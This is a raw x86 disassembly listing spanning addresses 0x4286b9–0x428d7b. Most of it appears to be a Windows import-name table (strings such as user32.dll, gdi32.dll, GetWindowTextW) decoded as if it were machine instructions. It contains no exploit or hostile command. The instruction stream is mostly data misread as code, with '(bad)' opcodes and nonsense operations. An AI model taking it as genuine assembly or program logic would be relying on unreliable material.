  4286b9:	mov    WORD PTR [edx],es
  4286bb:	add    BYTE PTR [eax],bl
  4286bd:	mov    WORD PTR [edx],es
  4286bf:	add    BYTE PTR [edx],ah
  4286c1:	mov    WORD PTR [edx],es
  4286c3:	add    BYTE PTR [esi],ch
  4286c5:	mov    WORD PTR [edx],es
  4286c7:	add    BYTE PTR [esi],bh
  4286c9:	mov    WORD PTR [edx],es
  4286cb:	add    BYTE PTR [eax-0x74],dl
  4286ce:	add    al,BYTE PTR [eax]
  4286d0:	outs   dx,BYTE PTR ds:[esi]
  4286d1:	mov    WORD PTR [edx],es
  4286d3:	add    BYTE PTR [eax-0x71fffd74],al
  4286d9:	mov    WORD PTR [edx],es
  4286db:	add    BYTE PTR [esp+ecx*4-0x734ffffe],bl
  4286e2:	add    al,BYTE PTR [eax]
  4286e4:	les    ecx,FWORD PTR [edx+eax*1+0x28cd400]
  4286eb:	add    dl,ah
  4286ed:	mov    WORD PTR [edx],es
  4286ef:	add    al,dh
  4286f1:	mov    WORD PTR [edx],es
  4286f3:	add    BYTE PTR [edx],al
  4286f5:	lea    eax,[edx]
  4286f7:	add    BYTE PTR [ecx*4-0x72dbfffe],dl
  4286fe:	add    al,BYTE PTR [eax]
  428700:	lea    eax,ss:[edx]
  428703:	add    BYTE PTR [edx-0x73],al
  428706:	add    al,BYTE PTR [eax]
  428708:	push   esi
  428709:	lea    eax,[edx]
  42870b:	add    BYTE PTR [edx-0x73],ch
  42870e:	add    al,BYTE PTR [eax]
  428710:	jp     0x42869f
  428712:	add    al,BYTE PTR [eax]
  428714:	xchg   BYTE PTR [ebp-0x726bfffe],cl
  42871a:	add    al,BYTE PTR [eax]
  42871c:	mov    ds:0xb200028d,al
  428721:	lea    eax,[edx]
  428723:	add    al,cl
  428725:	lea    eax,[edx]
  428727:	add    ah,dl
  428729:	lea    eax,[edx]
  42872b:	add    al,ah
  42872d:	lea    eax,[edx]
  42872f:	add    ah,ch
  428731:	lea    eax,[edx]
  428733:	add    BYTE PTR [edx],al
  428735:	mov    es,WORD PTR [edx]
  428737:	add    BYTE PTR [esi+ecx*4],dl
  42873a:	add    al,BYTE PTR [eax]
  42873c:	and    al,0x8e
  42873e:	add    al,BYTE PTR [eax]
  428740:	xor    cl,BYTE PTR [esi-0x71b9fffe]
  428746:	add    al,BYTE PTR [eax]
  428748:	push   esp
  428749:	mov    es,WORD PTR [edx]
  42874b:	add    BYTE PTR [eax-0x72],ch
  42874e:	add    al,BYTE PTR [eax]
  428750:	jp     0x4286e0
  428752:	add    al,BYTE PTR [eax]
  428754:	mov    BYTE PTR [esi-0x715bfffe],cl
  42875a:	add    al,BYTE PTR [eax]
  42875c:	mov    dh,0x8e
  42875e:	add    al,BYTE PTR [eax]
  428760:	(bad)  
  428761:	mov    es,WORD PTR [edx]
  428763:	add    al,ah
  428765:	mov    es,WORD PTR [edx]
  428767:	add    dh,dh
  428769:	mov    es,WORD PTR [edx]
  42876b:	add    BYTE PTR [edi+ecx*4],al
  42876e:	add    al,BYTE PTR [eax]
  428770:	adc    cl,BYTE PTR [edi-0x70d7fffe]
  428776:	add    al,BYTE PTR [eax]
  428778:	inc    esp
  428779:	pop    DWORD PTR [edx]
  42877b:	add    BYTE PTR [edx-0x71],dl
  42877e:	add    al,BYTE PTR [eax]
  428780:	pop    DWORD PTR fs:[edx]
  428783:	add    BYTE PTR [eax-0x71],bh
  428786:	add    al,BYTE PTR [eax]
  428788:	mov    cs,WORD PTR [edi-0x705bfffe]
  42878e:	add    al,BYTE PTR [eax]
  428790:	mov    edx,0xc800028f
  428795:	pop    DWORD PTR [edx]
  428797:	add    ah,bl
  428799:	pop    DWORD PTR [edx]
  42879b:	add    ah,ch
  42879d:	pop    DWORD PTR [edx]
  42879f:	add    al,bh
  4287a1:	pop    DWORD PTR [edx]
  4287a3:	add    BYTE PTR [edx],cl
  4287a5:	nop
  4287a6:	add    al,BYTE PTR [eax]
  4287a8:	sbb    dl,BYTE PTR [eax-0x6fd3fffe]
  4287ae:	add    al,BYTE PTR [eax]
  4287b0:	cmp    dl,BYTE PTR [eax-0x6fb3fffe]
  4287b6:	add    al,BYTE PTR [eax]
  4287b8:	bound  edx,QWORD PTR [eax-0x6f81fffe]
  4287be:	add    al,BYTE PTR [eax]
  4287c0:	xchg   esp,eax
  4287c1:	nop
  4287c2:	add    al,BYTE PTR [eax]
  4287c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4287c5:	nop
  4287c6:	add    al,BYTE PTR [eax]
  4287c8:	mov    eax,0xca000290
  4287cd:	nop
  4287ce:	add    al,BYTE PTR [eax]
  4287d0:	ficom  WORD PTR [eax-0x6f13fffe]
  4287d6:	add    al,BYTE PTR [eax]
  4287d8:	cld    
  4287d9:	nop
  4287da:	add    al,BYTE PTR [eax]
  4287dc:	or     BYTE PTR [ecx-0x6ee9fffe],dl
  4287e2:	add    al,BYTE PTR [eax]
  4287e4:	cs xchg ecx,eax
  4287e6:	add    al,BYTE PTR [eax]
  4287e8:	ds xchg ecx,eax
  4287ea:	add    al,BYTE PTR [eax]
  4287ec:	dec    esp
  4287ed:	xchg   ecx,eax
  4287ee:	add    al,BYTE PTR [eax]
  4287f0:	pusha  
  4287f1:	xchg   ecx,eax
  4287f2:	add    al,BYTE PTR [eax]
  4287f4:	outs   dx,BYTE PTR ds:[esi]
  4287f5:	xchg   ecx,eax
  4287f6:	add    al,BYTE PTR [eax]
  4287f8:	jp     0x42878b
  4287fa:	add    al,BYTE PTR [eax]
  4287fc:	mov    WORD PTR [ecx-0x6e61fffe],ss
  428802:	add    al,BYTE PTR [eax]
  428804:	mov    al,0x91
  428806:	add    al,BYTE PTR [eax]
  428808:	(bad)  
  428809:	xchg   ecx,eax
  42880a:	add    al,BYTE PTR [eax]
  42880c:	rcl    BYTE PTR [ecx-0x6e1ffffe],cl
  428812:	add    al,BYTE PTR [eax]
  428814:	in     al,dx
  428815:	xchg   ecx,eax
  428816:	add    al,BYTE PTR [eax]
  428818:	cli    
  428819:	xchg   ecx,eax
  42881a:	add    al,BYTE PTR [eax]
  42881c:	push   cs
  42881d:	xchg   edx,eax
  42881e:	add    al,BYTE PTR [eax]
  428820:	sbb    dl,BYTE PTR [edx-0x6dd1fffe]
  428826:	add    al,BYTE PTR [eax]
  428828:	cmp    dl,BYTE PTR [edx-0x6db5fffe]
  42882e:	add    al,BYTE PTR [eax]
  428830:	pop    eax
  428831:	xchg   edx,eax
  428832:	add    al,BYTE PTR [eax]
  428834:	outs   dx,BYTE PTR ds:[esi]
  428835:	xchg   edx,eax
  428836:	add    al,BYTE PTR [eax]
  428838:	add    BYTE PTR [eax],al
  42883a:	add    BYTE PTR [eax],al
  42883c:	xchg   BYTE PTR [edx-0x6d6bfffe],dl
  428842:	add    al,BYTE PTR [eax]
  428844:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428845:	xchg   edx,eax
  428846:	add    al,BYTE PTR [eax]
  428848:	mov    esi,0xd0000292
  42884d:	xchg   edx,eax
  42884e:	add    al,BYTE PTR [eax]
  428850:	loop   0x4287e4
  428852:	add    al,BYTE PTR [eax]
  428854:	cld    
  428855:	xchg   edx,eax
  428856:	add    al,BYTE PTR [eax]
  428858:	or     al,0x93
  42885a:	add    al,BYTE PTR [eax]
  42885c:	push   ss
  42885d:	xchg   ebx,eax
  42885e:	add    al,BYTE PTR [eax]
  428860:	sub    BYTE PTR [ebx-0x6cc7fffe],dl
  428866:	add    al,BYTE PTR [eax]
  428868:	push   eax
  428869:	xchg   ebx,eax
  42886a:	add    al,BYTE PTR [eax]
  42886c:	pusha  
  42886d:	xchg   ebx,eax
  42886e:	add    al,BYTE PTR [eax]
  428870:	jo     0x428805
  428872:	add    al,BYTE PTR [eax]
  428874:	adc    BYTE PTR [ebx-0x6c6bfffe],0x2
  42887b:	add    BYTE PTR [eax-0x53fffd6d],ah
  428881:	xchg   ebx,eax
  428882:	add    al,BYTE PTR [eax]
  428884:	ret    0x293
  428887:	add    dh,dl
  428889:	xchg   ebx,eax
  42888a:	add    al,BYTE PTR [eax]
  42888c:	in     al,dx
  42888d:	xchg   ebx,eax
  42888e:	add    al,BYTE PTR [eax]
  428890:	add    BYTE PTR [edx+eax*1+0x2941600],dl
  428897:	add    BYTE PTR [eax],ch
  428899:	xchg   esp,eax
  42889a:	add    al,BYTE PTR [eax]
  42889c:	xor    al,0x94
  42889e:	add    al,BYTE PTR [eax]
  4288a0:	inc    esp
  4288a1:	xchg   esp,eax
  4288a2:	add    al,BYTE PTR [eax]
  4288a4:	bound  edx,QWORD PTR [edx+eax*1+0x2947c00]
  4288ab:	add    BYTE PTR [edx-0x61fffd6c],cl
  4288b1:	xchg   esp,eax
  4288b2:	add    al,BYTE PTR [eax]
  4288b4:	mov    dh,0x94
  4288b6:	add    al,BYTE PTR [eax]
  4288b8:	retf   0x294
  4288bb:	add    dl,bl
  4288bd:	xchg   esp,eax
  4288be:	add    al,BYTE PTR [eax]
  4288c0:	lock xchg esp,eax
  4288c2:	add    al,BYTE PTR [eax]
  4288c4:	add    dl,BYTE PTR [ebp-0x6aeffffe]
  4288ca:	add    al,BYTE PTR [eax]
  4288cc:	and    dl,BYTE PTR [ebp-0x6acffffe]
  4288d2:	add    al,BYTE PTR [eax]
  4288d4:	inc    eax
  4288d5:	xchg   ebp,eax
  4288d6:	add    al,BYTE PTR [eax]
  4288d8:	push   esi
  4288d9:	xchg   ebp,eax
  4288da:	add    al,BYTE PTR [eax]
  4288dc:	ins    BYTE PTR es:[edi],dx
  4288dd:	xchg   ebp,eax
  4288de:	add    al,BYTE PTR [eax]
  4288e0:	jl     0x428877
  4288e2:	add    al,BYTE PTR [eax]
  4288e4:	xchg   edx,eax
  4288e5:	xchg   ebp,eax
  4288e6:	add    al,BYTE PTR [eax]
  4288e8:	pushf  
  4288e9:	xchg   ebp,eax
  4288ea:	add    al,BYTE PTR [eax]
  4288ec:	scas   al,BYTE PTR es:[edi]
  4288ed:	xchg   ebp,eax
  4288ee:	add    al,BYTE PTR [eax]
  4288f0:	mov    esi,0xcc000295
  4288f5:	xchg   ebp,eax
  4288f6:	add    al,BYTE PTR [eax]
  4288f8:	loop   0x42888f
  4288fa:	add    al,BYTE PTR [eax]
  4288fc:	add    BYTE PTR [eax],al
  4288fe:	add    BYTE PTR [eax],al
  428900:	xchg   edx,eax
  428901:	add    edx,DWORD PTR [edx+0x74]
  428904:	ins    BYTE PTR es:[edi],dx
  428905:	dec    ecx
  428906:	outs   dx,BYTE PTR ds:[esi]
  428907:	imul   esi,DWORD PTR [ecx+eax*2+0x6e],0x74536973
  42890f:	jb     0x42897a
  428911:	outs   dx,BYTE PTR ds:[esi]
  428912:	add    BYTE PTR [bp+0x74],ch
  428916:	fs ins BYTE PTR es:[edi],dx
  428918:	ins    BYTE PTR es:[edi],dx
  428919:	cs fs ins BYTE PTR es:[edi],dx
  42891c:	ins    BYTE PTR es:[edi],dx
  42891d:	add    BYTE PTR [ecx+0x74654701],dl
  428923:	push   esi
  428924:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  42892b:	dec    edi
  42892c:	jb     0x428995
  42892e:	inc    ebp
  42892f:	js     0x428931
  428931:	add    BYTE PTR [edx+0x74654701],cl
  428937:	push   esp
  428938:	gs js  0x4289af
  42893b:	inc    ebp
  42893c:	js     0x4289b2
  42893e:	outs   dx,BYTE PTR gs:[esi]
  428940:	je     0x428992
  428942:	outs   dx,DWORD PTR ds:[esi]
  428943:	imul   ebp,DWORD PTR [esi+0x74],0x1fb0057
  42894a:	push   ebx
  42894b:	gs je  0x4289a2
  42894e:	gs js  0x4289c5
  428951:	inc    ecx
  428952:	ins    BYTE PTR es:[edi],dx
  428953:	imul   esp,DWORD PTR [edi+0x6e],0xd50000
  42895a:	inc    ebp
  42895b:	js     0x4289d1
  42895d:	push   esp
  42895e:	gs js  0x4289d5
  428961:	dec    edi
  428962:	jne    0x4289d8
  428964:	push   edi
  428965:	add    BYTE PTR [eax],dl
  428967:	add    dl,BYTE PTR [edx+esi*2+0x61]
  42896b:	outs   dx,BYTE PTR ds:[esi]
  42896c:	jae    0x4289da
  42896e:	popa   
  42896f:	je     0x4289d6
  428971:	inc    ebx
  428972:	push   0x65737261
  428977:	je     0x4289c2
  428979:	outs   dx,BYTE PTR ds:[esi]
  42897a:	outs   dx,WORD PTR ds:[esi]
  42897c:	add    BYTE PTR [eax],al
  42897e:	pop    ss
  42897f:	add    dl,BYTE PTR [edi+0x69]
  428982:	fs outs dx,BYTE PTR gs:[esi]
  428985:	push   eax
  428986:	popa   
  428987:	je     0x4289f1
  428989:	add    BYTE PTR [ebp+0x65724300],cl
  42898f:	popa   
  428990:	je     0x4289f7
  428992:	inc    ebx
  428993:	outs   dx,DWORD PTR ds:[esi]
  428994:	ins    DWORD PTR es:[edi],dx
  428995:	jo     0x4289f8
  428997:	je     0x428a02
  428999:	bound  ebp,QWORD PTR [ebp+eiz*2+0x44]
  42899d:	inc    ebx
  42899e:	add    BYTE PTR [eax],al
  4289a0:	mov    bh,0x1
  4289a2:	push   eax
  4289a3:	outs   dx,DWORD PTR ds:[esi]
  4289a4:	ins    BYTE PTR es:[edi],dx
  4289a5:	jns    0x428a13
  4289a7:	imul   ebp,DWORD PTR [esi+0x65],0x1940000
  4289ae:	inc    edi
  4289af:	gs je  0x428a09
  4289b2:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4289b9:	addr16 inc ebp
  4289bb:	js     0x4289bd
  4289bd:	add    cl,ch
  4289bf:	add    DWORD PTR [ebx+0x65],edx
  4289c2:	je     0x428a10
  4289c4:	popa   
  4289c5:	jns    0x428a36
  4289c7:	jne    0x428a3d
  4289c9:	add    bl,dl
  4289cb:	add    DWORD PTR [ebx+0x65],edx
  4289ce:	je     0x428a11
  4289d0:	bound  ebp,QWORD PTR [edi+0x72]
  4289d3:	je     0x428a25
  4289d5:	jb     0x428a46
  4289d7:	arpl   WORD PTR [eax],ax
  4289d9:	add    BYTE PTR [edx],cl
  4289db:	add    dl,BYTE PTR [ebx+0x74]
  4289de:	jb     0x428a45
  4289e0:	je     0x428a45
  4289e2:	push   0x69424944
  4289e7:	je     0x428a5c
  4289e9:	add    BYTE PTR [ebx+0x1],al
  4289ec:	inc    edi
  4289ed:	gs je  0x428a34
  4289f0:	dec    ecx
  4289f1:	inc    edx
  4289f2:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655301eb
  4289fa:	je     0x428a49
  4289fc:	popa   
  4289fd:	jo     0x428a4c
  4289ff:	outs   dx,DWORD PTR ds:[esi]
  428a00:	fs add BYTE PTR gs:[eax],al
  428a04:	daa    
  428a05:	add    DWORD PTR [edi+0x65],eax
  428a08:	je     0x428a4c
  428a0a:	imul   ecx,DWORD PTR [ebp+0x6f],0x64
  428a0e:	add    BYTE PTR gs:[ebx+0x66664f01],ah
  428a15:	jae    0x428a7c
  428a17:	je     0x428a6b
  428a19:	outs   dx,BYTE PTR ds:[si]
  428a1b:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  428a22:	jo     0x428a97
  428a24:	gs add ah,cl
  428a27:	add    DWORD PTR [ebx+0x63],edx
  428a2a:	popa   
  428a2b:	ins    BYTE PTR es:[edi],dx
  428a2c:	gs push edi
  428a2e:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428a35:	je     0x428a7c
  428a37:	js     0x428a39
  428a39:	add    BYTE PTR [edx+0x1],bh
  428a3c:	inc    edi
  428a3d:	gs je  0x428a93
  428a40:	je     0x428ab1
  428a42:	arpl   WORD PTR [ebx+0x4f],bp
  428a45:	bound  ebp,QWORD PTR [edx+0x65]
  428a48:	arpl   WORD PTR [eax+eax*1+0x0],si
  428a4c:	call   0x5465:0x6e694c01
  428a53:	outs   dx,DWORD PTR ds:[esi]
  428a54:	add    BYTE PTR [eax],al
  428a56:	mov    dh,0x1
  428a58:	push   eax
  428a59:	outs   dx,DWORD PTR ds:[esi]
  428a5a:	ins    BYTE PTR es:[edi],dx
  428a5b:	jns    0x428ac4
  428a5d:	outs   dx,DWORD PTR ds:[esi]
  428a5e:	outs   dx,BYTE PTR ds:[esi]
  428a5f:	add    BYTE PTR [esi+0x1],bh
  428a62:	inc    edi
  428a63:	gs je  0x428aba
  428a66:	gs js  0x428add
  428a69:	inc    ecx
  428a6a:	ins    BYTE PTR es:[edi],dx
  428a6b:	imul   esp,DWORD PTR [edi+0x6e],0x18c0000
  428a72:	inc    edi
  428a73:	gs je  0x428aca
  428a76:	gs js  0x428aed
  428a79:	inc    esi
  428a7a:	popa   
  428a7b:	arpl   WORD PTR [ebp+0x57],sp
  428a7e:	add    BYTE PTR [eax],al
  428a80:	mov    ebx,0x61655201
  428a85:	ins    BYTE PTR es:[edi],dx
  428a86:	imul   edi,DWORD PTR [edx+0x65],0x656c6150
  428a8d:	je     0x428b03
  428a8f:	add    BYTE PTR gs:[eax],al
  428a92:	mov    DWORD PTR [ecx],0x69736552
  428a98:	jp     0x428aff
  428a9a:	push   eax
  428a9b:	popa   
  428a9c:	ins    BYTE PTR es:[edi],dx
  428a9d:	gs je  0x428b14
  428aa0:	add    BYTE PTR gs:[ecx+0x6d6f4300],al
  428aa7:	bound  ebp,QWORD PTR [ecx+0x6e]
  428aaa:	gs push edx
  428aac:	outs   dx,BYTE PTR ds:[si]
  428aae:	add    BYTE PTR [eax],al
  428ab0:	push   cs
  428ab1:	add    dl,BYTE PTR [ebp+eiz*2+0x78]
  428ab5:	je     0x428b06
  428ab7:	jne    0x428b2d
  428ab9:	inc    ecx
  428aba:	add    BYTE PTR [eax],al
  428abc:	test   DWORD PTR [ecx],0x52746553
  428ac2:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428ac7:	outs   dx,BYTE PTR ds:[esi]
  428ac8:	add    BYTE PTR [eax],al
  428aca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428acb:	add    BYTE PTR [ebx+0x72],al
  428ace:	gs popa 
  428ad0:	je     0x428b37
  428ad2:	push   eax
  428ad3:	popa   
  428ad4:	ins    BYTE PTR es:[edi],dx
  428ad5:	gs je  0x428b4c
  428ad8:	add    BYTE PTR gs:[ecx+eax*1],ah
  428adc:	inc    edi
  428add:	gs je  0x428b22
  428ae0:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428ae8:	jae    0x428aea
  428aea:	mov    DWORD PTR [eax],0x6d756e45
  428af0:	inc    esi
  428af1:	outs   dx,DWORD PTR ds:[esi]
  428af2:	outs   dx,BYTE PTR ds:[esi]
  428af3:	je     0x428b68
  428af5:	push   edi
  428af6:	add    BYTE PTR [eax],al
  428af8:	lods   al,BYTE PTR ds:[esi]
  428af9:	add    BYTE PTR [ebx+0x72],al
  428afc:	gs popa 
  428afe:	je     0x428b65
  428b00:	push   edx
  428b01:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b06:	outs   dx,BYTE PTR ds:[esi]
  428b07:	dec    ecx
  428b08:	outs   dx,BYTE PTR ds:[esi]
  428b09:	imul   esi,DWORD PTR fs:[edx+0x65],0x99007463
  428b11:	add    DWORD PTR [ecx+ebp*2+0x6e],ecx
  428b15:	gs inc esp
  428b17:	inc    esp
  428b18:	inc    ecx
  428b19:	add    ch,dl
  428b1b:	add    DWORD PTR [ebx+0x65],edx
  428b1e:	je     0x428b62
  428b20:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x74694270
  428b28:	jae    0x428b2a
  428b2a:	mov    BYTE PTR [eax],al
  428b2c:	inc    ebx
  428b2d:	jb     0x428b94
  428b2f:	popa   
  428b30:	je     0x428b97
  428b32:	inc    edx
  428b33:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428b3b:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428b42:	mov    es,WORD PTR [ecx]
  428b44:	inc    edi
  428b45:	gs je  0x428b9c
  428b48:	gs js  0x428bbf
  428b4b:	dec    ebp
  428b4c:	gs je  0x428bc1
  428b4f:	imul   esp,DWORD PTR [ebx+0x73],0x1da0057
  428b56:	push   ebx
  428b57:	gs je  0x428b9c
  428b5a:	jb     0x428bd1
  428b5c:	jae    0x428bc6
  428b5e:	dec    edi
  428b5f:	jb     0x428bc8
  428b61:	inc    ebp
  428b62:	js     0x428b64
  428b64:	mov    esp,0x63655201
  428b69:	je     0x428bb4
  428b6b:	outs   dx,BYTE PTR ds:[esi]
  428b6c:	push   edx
  428b6d:	imul   ebp,DWORD PTR gs:[bx+0x6e],0xcd0000
  428b76:	inc    ebp
  428b77:	jae    0x428bdc
  428b79:	popa   
  428b7a:	jo     0x428be1
  428b7c:	add    BYTE PTR [eax],al
  428b7e:	scas   eax,DWORD PTR es:[edi]
  428b7f:	add    DWORD PTR [eax+0x6f],edx
  428b82:	ins    BYTE PTR es:[edi],dx
  428b83:	jns    0x428bc7
  428b85:	gs jp  0x428bf1
  428b88:	gs jb  0x428b8b
  428b8b:	add    BYTE PTR [ebx+0x65724300],ch
  428b91:	popa   
  428b92:	je     0x428bf9
  428b94:	push   edx
  428b95:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  428b9a:	outs   dx,BYTE PTR ds:[esi]
  428b9b:	add    BYTE PTR [edi+0x65724300],cl
  428ba1:	popa   
  428ba2:	je     0x428c09
  428ba4:	inc    esp
  428ba5:	inc    ebx
  428ba6:	push   edi
  428ba7:	add    BYTE PTR ds:0x74654701,bh
  428bad:	inc    ebx
  428bae:	jne    0x428c22
  428bb0:	jb     0x428c17
  428bb2:	outs   dx,BYTE PTR ds:[esi]
  428bb3:	je     0x428c04
  428bb5:	bound  ebp,QWORD PTR [edx+0x65]
  428bb8:	arpl   WORD PTR [eax+eax*1+0x0],si
  428bbc:	inc    edi
  428bbd:	inc    esp
  428bbe:	dec    ecx
  428bbf:	xor    esi,DWORD PTR [edx]
  428bc1:	cs fs ins BYTE PTR es:[edi],dx
  428bc4:	ins    BYTE PTR es:[edi],dx
  428bc5:	add    BYTE PTR [ebx+0x6f],ah
  428bc8:	outs   dx,BYTE PTR ds:[esi]
  428bc9:	jae    0x428c3a
  428bcb:	ins    BYTE PTR es:[edi],dx
  428bcc:	gs cs fs ins BYTE PTR es:[edi],dx
  428bd0:	ins    BYTE PTR es:[edi],dx
  428bd1:	add    BYTE PTR [ecx],bh
  428bd3:	add    BYTE PTR [ebx+0x68],al
  428bd6:	popa   
  428bd7:	jb     0x428c2e
  428bd9:	jo     0x428c4b
  428bdb:	gs jb  0x428c35
  428bde:	add    BYTE PTR [eax],al
  428be0:	dec    esi
  428be1:	add    dl,BYTE PTR [ebx+0x65]
  428be4:	je     0x428c33
  428be6:	outs   dx,BYTE PTR gs:[esi]
  428be8:	jne    0x428c33
  428bea:	je     0x428c51
  428bec:	ins    DWORD PTR es:[edi],dx
  428bed:	dec    ecx
  428bee:	outs   dx,BYTE PTR ds:[esi]
  428bef:	outs   dx,WORD PTR ds:[esi]
  428bf1:	push   edi
  428bf2:	add    BYTE PTR [eax],al
  428bf4:	scas   al,BYTE PTR es:[edi]
  428bf5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  428bf9:	fs inc ebx
  428bfb:	jne    0x428c6f
  428bfd:	jae    0x428c6e
  428bff:	jb     0x428c58
  428c01:	add    BYTE PTR [eax+0x0],bl
  428c04:	inc    ebx
  428c05:	jb     0x428c6c
  428c07:	popa   
  428c08:	je     0x428c6f
  428c0a:	inc    esp
  428c0b:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  428c12:	jb     0x428c75
  428c14:	ins    DWORD PTR es:[edi],dx
  428c15:	inc    ecx
  428c16:	add    BYTE PTR [eax],al
  428c18:	popf   
  428c19:	add    DWORD PTR [ecx+0x73],ecx
  428c1c:	dec    ebp
  428c1d:	outs   dx,BYTE PTR gs:[esi]
  428c1f:	jne    0x428c21
  428c21:	add    BYTE PTR [eax+0x1],ch
  428c24:	inc    edi
  428c25:	gs je  0x428c7f
  428c28:	imul   ebp,DWORD PTR [esi+0x64],0x6200776f
  428c2f:	add    DWORD PTR [edi+0x65],eax
  428c32:	je     0x428c88
  428c34:	outs   dx,DWORD PTR ds:[esi]
  428c35:	jo     0x428c8e
  428c37:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  428c3e:	mov    ds:0x57734901,eax
  428c43:	imul   ebp,DWORD PTR [esi+0x64],0x6956776f
  428c4a:	jae    0x428cb5
  428c4c:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  428c50:	sub    eax,0x74654701
  428c55:	dec    ebp
  428c56:	outs   dx,BYTE PTR gs:[esi]
  428c58:	jne    0x428c9d
  428c5a:	push   0x4d6b6365
  428c5f:	popa   
  428c60:	jb     0x428ccd
  428c62:	inc    esp
  428c63:	imul   ebp,DWORD PTR [ebp+0x65],0x6f69736e
  428c6a:	outs   dx,BYTE PTR ds:[esi]
  428c6b:	jae    0x428c6d
  428c6d:	add    BYTE PTR [edx],bl
  428c6f:	add    BYTE PTR [ebx+0x61],al
  428c72:	ins    BYTE PTR es:[edi],dx
  428c73:	ins    BYTE PTR es:[edi],dx
  428c74:	push   edi
  428c75:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428c7c:	outs   dx,DWORD PTR ds:[esi]
  428c7d:	arpl   WORD PTR [ecx+0x0],ax
  428c80:	repz add BYTE PTR [edi+0x65],al
  428c84:	je     0x428cc9
  428c86:	popa   
  428c87:	jb     0x428cee
  428c89:	je     0x428cdb
  428c8b:	outs   dx,DWORD PTR ds:[esi]
  428c8c:	jae    0x428c8e
  428c8e:	ret    0x7702
  428c91:	jbe    0x428d06
  428c93:	jo     0x428d07
  428c95:	imul   ebp,DWORD PTR [esi+0x74],0x5766
  428c9c:	test   al,0x1
  428c9e:	dec    esp
  428c9f:	outs   dx,DWORD PTR ds:[esi]
  428ca0:	popa   
  428ca1:	fs inc ecx
  428ca3:	arpl   WORD PTR [ebx+0x65],sp
  428ca6:	ins    BYTE PTR es:[edi],dx
  428ca7:	gs jb  0x428d0b
  428caa:	je     0x428d1b
  428cac:	jb     0x428d21
  428cae:	push   edi
  428caf:	add    BYTE PTR [edi],cl
  428cb1:	add    BYTE PTR [edx+0x72],al
  428cb4:	imul   ebp,DWORD PTR [esi+0x67],0x646e6957
  428cbb:	outs   dx,DWORD PTR ds:[esi]
  428cbc:	ja     0x428d12
  428cbe:	outs   dx,DWORD PTR ds:[esi]
  428cbf:	push   esp
  428cc0:	outs   dx,DWORD PTR ds:[esi]
  428cc1:	jo     0x428cc3
  428cc3:	add    BYTE PTR [ecx+0x66654400],cl
  428cc9:	inc    esi
  428cca:	jb     0x428d2d
  428ccc:	ins    DWORD PTR es:[edi],dx
  428ccd:	gs push eax
  428ccf:	jb     0x428d40
  428cd1:	arpl   WORD PTR [ecx+0x0],ax
  428cd4:	mov    ebx,0x61724400
  428cd9:	ja     0x428d2f
  428cdb:	gs js  0x428d52
  428cde:	inc    ebp
  428cdf:	js     0x428d38
  428ce1:	add    BYTE PTR [edx+0x666e4901],al
  428ce7:	ins    BYTE PTR es:[edi],dx
  428ce8:	popa   
  428ce9:	je     0x428d50
  428ceb:	push   edx
  428cec:	arpl   WORD PTR gs:[eax+eax*1+0x5],si
  428cf1:	add    dl,BYTE PTR [edx+0x65]
  428cf4:	imul   esi,DWORD PTR [bp+di+0x74],0x6c437265
  428cfc:	popa   
  428cfd:	jae    0x428d72
  428cff:	push   edi
  428d00:	add    BYTE PTR [eax],al
  428d02:	inc    ebp
  428d03:	add    dl,BYTE PTR [ebx+0x65]
  428d06:	je     0x428d54
  428d08:	popa   
  428d09:	jae    0x428d7f
  428d0b:	inc    ebp
  428d0c:	jb     0x428d80
  428d0e:	outs   dx,DWORD PTR ds:[esi]
  428d0f:	jb     0x428d56
  428d11:	js     0x428d13
  428d13:	add    BYTE PTR [edx+0x43734901],dl
  428d19:	push   0x70557261
  428d1e:	jo     0x428d85
  428d20:	jb     0x428d63
  428d22:	add    BYTE PTR [eax],al
  428d24:	inc    ebx
  428d25:	add    BYTE PTR [ebx+0x6c],al
  428d28:	imul   esp,DWORD PTR [ebp+0x6e],0x536f5474
  428d2f:	arpl   WORD PTR [edx+0x65],si
  428d32:	outs   dx,BYTE PTR gs:[esi]
  428d34:	add    BYTE PTR [eax],al
  428d36:	push   ecx
  428d37:	add    dl,BYTE PTR [ebx+0x65]
  428d3a:	je     0x428d8c
  428d3c:	popa   
  428d3d:	jb     0x428da4
  428d3f:	outs   dx,BYTE PTR ds:[esi]
  428d40:	je     0x428d42
  428d42:	xchg   ecx,eax
  428d43:	add    dl,BYTE PTR [edx+esi*2+0x61]
  428d47:	arpl   WORD PTR [ebx+0x50],bp
  428d4a:	outs   dx,DWORD PTR ds:[esi]
  428d4b:	jo     0x428dc2
  428d4d:	jo     0x428d9c
  428d4f:	outs   dx,BYTE PTR gs:[esi]
  428d51:	jne    0x428d98
  428d53:	js     0x428d55
  428d55:	add    BYTE PTR [edx],ah
  428d57:	add    DWORD PTR [edi+0x65],eax
  428d5a:	je     0x428da7
  428d5c:	gs jns 0x428dc1
  428d5f:	outs   dx,DWORD PTR ds:[esi]
  428d60:	popa   
  428d61:	jb     0x428dc7
  428d63:	dec    esp
  428d64:	popa   
  428d65:	jns    0x428dd6
  428d67:	jne    0x428ddd
  428d69:	add    bl,bh
  428d6b:	add    BYTE PTR [edi+0x65],al
  428d6e:	je     0x428db3
  428d70:	ins    BYTE PTR es:[edi],dx
  428d71:	popa   
  428d72:	jae    0x428de7
  428d74:	dec    esi
  428d75:	popa   
  428d76:	ins    DWORD PTR es:[edi],dx
  428d77:	gs push edi
  428d79:	add    ch,bl
  428d7b:	add    BYTE PTR [ebp+0x71],al
